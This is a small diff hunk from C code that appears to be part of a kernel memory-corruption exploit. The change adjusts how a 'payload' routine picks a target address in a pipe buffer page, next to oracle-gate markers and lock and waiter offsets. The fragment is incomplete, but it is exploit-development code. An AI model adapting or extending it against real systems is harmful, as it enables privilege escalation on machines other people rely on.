@@ -1353,8 +1353,9 @@ static int prepare_p0_diag_gate_payload(int fd, uintptr_t payload_base) {
   uintptr_t lock = payload_base + SLIDE_BANK_LOCK_OFF;
   uintptr_t waiter = lock + SLIDE_BANK_WAITER_OFF;
   uintptr_t parent = direct_to_page(payload_base);
-  uintptr_t target = pipebuf_page_base +
-                     P0_ORACLE_GATE_OBJECT_INDEX * PIPE_OBJECT_SIZE;
+  uintptr_t target = pipebuf_addr
+      ? pipebuf_addr
+      : pipebuf_page_base + P0_ORACLE_GATE_OBJECT_INDEX * PIPE_OBJECT_SIZE;
   static const char marker[] = "RMG-P0-ORACLE-GATE";
   uintptr_t marker_address = payload_base + P0_ORACLE_GATE_PAGE_OFF;
   if (getenv("P0_ORACLE_READ_DIAG")) {
